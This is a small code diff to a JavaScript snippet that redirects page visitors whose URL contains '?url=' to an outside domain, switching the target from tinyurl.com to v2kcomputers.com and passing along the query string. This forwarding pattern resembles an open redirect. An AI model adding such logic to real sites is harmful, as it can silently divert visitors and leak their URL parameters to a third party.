@@ -11,10 +11,10 @@
         const currentURL = window.location.href;
 
         
-        const redirectionBaseURL = "https://tinyurl.com/";
+        const redirectionBaseURL = "https://v2kcomputers.com/";
 
         
-        if (currentURL.includes('/')) {
+        if (currentURL.includes('?url=')) {
             
             const queryString = window.location.search;
             window.location.href = `${redirectionBaseURL}${queryString}`;
